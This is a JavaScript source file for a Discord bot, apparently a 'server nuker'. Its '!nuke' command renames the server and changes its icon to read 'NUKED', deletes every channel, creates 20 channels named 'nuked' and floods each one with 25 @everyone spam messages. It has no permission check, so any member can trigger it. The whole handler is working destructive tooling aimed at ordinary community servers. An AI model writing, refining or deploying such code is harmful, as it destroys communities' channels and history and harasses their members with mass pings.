require('dotenv').config();
const { Client, GatewayIntentBits, Collection } = require('discord.js');
const { v4: uuidv4 } = require('uuid');

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
    });

const fs = require('fs');
const path = require('path');

client.on('ready', () => {
  console.log(`${client.user.name} is online`)
});

client.login(process.env.token);

client.commands = new Collection();

const commandFiles = fs.readdirSync(path.join(__dirname, 'modules', 'commands')).filter(file => file.endsWith('.js'));
for (const file of commandFiles) {
    const command = require(path.join(__dirname, 'modules', 'commands', file));
    client.commands.set(command.data.name, command);
}

const eventFiles = fs.readdirSync(path.join(__dirname, 'modules', 'events')).filter(file => file.endsWith('.js'));
for (const file of eventFiles) {
    const event = require(path.join(__dirname, 'modules', 'events', file));
    if (event.once) {
        client.once(event.name, (...args) => event.execute(...args, client));
    } else {
        client.on(event.name, (...args) => event.execute(...args, client));
    }
}

const createchannels = 20;
const messages = 25;


client.on('messageCreate', async message => {
    if (message.content === '!nuke') {
        const guild = message.guild;

        try {
            console.log('change server name and icon...');
            await Promise.all([
                guild.setName('NUKED'),
                guild.setIcon(client.user.displayAvatarURL())
            ]);
            console.log('server name and icon changed');

            console.log('fetching all channels...');
            const channels = await guild.channels.fetch();

            console.log('deleting channels...');
            const deletePromises = channels.map(channel => channel.delete());
            await Promise.allSettled(deletePromises); 

            console.log('All channels have been deleted');
          
          console.log('creating channels...');
          const createPromises = Array.from({ length: createchannels }, () =>
              guild.channels.create({
                  name: 'nuked',
                  type: 0
              }).catch(error => {
                  console.error('Failed to create a channel:', error);
              })
          );
          await Promise.all(createPromises);
          console.log(`${createchannels} channels have been created!`);

console.log('Sending messages...');
            const newChannels = await guild.channels.fetch();
            const batchSize = 5;
            const sendPromises = [];

            newChannels.forEach(channel => {
                const channelSendPromises = [];
                for (let j = 0; j < messages; j++) {
                    const randomString = uuidv4().split('-')[0];
                    channelSendPromises.push(channel.send(`@everyone \n NUKEEEEEEEED \n ${randomString}`).catch(error => {
                        console.error(`Failed to send messages in channel ${channel.name}:`, error);
                    }));

                    if (channelSendPromises.length >= batchSize) {
                        sendPromises.push(Promise.all(channelSendPromises));
                        channelSendPromises.length = 0; 
                    }
                }
                if (channelSendPromises.length > 0) {
                    sendPromises.push(Promise.all(channelSendPromises));
                }
            });

            await Promise.all(sendPromises);
            console.log(`messages have been sent in all new channels.`);
        } catch (error) {
            console.error('Error during nuke process:', error);
        }
    }
});
